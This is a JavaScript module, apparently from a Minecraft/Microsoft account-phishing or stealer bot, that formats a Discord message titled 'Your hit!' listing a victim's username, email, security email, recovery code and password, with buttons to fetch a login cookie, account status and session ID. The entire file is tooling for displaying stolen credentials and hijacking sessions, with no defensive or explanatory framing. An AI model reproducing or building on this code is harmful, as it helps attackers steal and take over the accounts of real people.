const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js")

module.exports = (data) => {
    let fields = [
        {
            name: "Username",
            value: "```" + `${data?.old_mcname ? data.old_mcname : `Doesn't own Minecraft!`}` + "```",
            inline: false
        },
        {
            name: "Email",
            value: "```" + `${data.email ? data.email : `Loading...`}` + "```",
            inline: true
        },
        {
            name: "Security Email",
            value: "```" + `${data.security_email ? data.security_email : "Loading..."}` + "```",
            inline: true
        },
        {
            name: "Recovery Code",
            value: "```" + `${data.recovery_code ? data.recovery_code : `Loading...`}` + "```",
            inline: false
        },
        {
            name: "Password",
            value: "```" + `${data.password ? data.password : `Loading...`}` + "```",
            inline: false
        }
    ]
    if (data.locked == "1") {
        fields.push({
            name: "Locked",
            value: "```Account is Locked!```",
            inline: false
        })
    }
    let components = [
        new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId("refresh|" + data.id).setEmoji("🔄").setLabel("Refresh").setStyle(ButtonStyle.Primary)
        ).addComponents(
            new ButtonBuilder().setCustomId("getlogincookie|" + data.id).setEmoji("🍪").setLabel("Get Login Cookie").setStyle(ButtonStyle.Primary)
        ).addComponents(
            new ButtonBuilder().setCustomId("getstatus|" + data.id).setEmoji("📊").setLabel("Get Status").setStyle(ButtonStyle.Primary)
        ).addComponents(
            new ButtonBuilder().setCustomId("getssid|" + data.id).setLabel("Get SSID").setEmoji("🔑").setStyle(ButtonStyle.Primary)
        )]
    return {
        embeds: [{
            title: `Your hit!`,
            fields: fields,
            color: 0x00ff00
        }],
        components: components,
        ephemeral: true
    }
}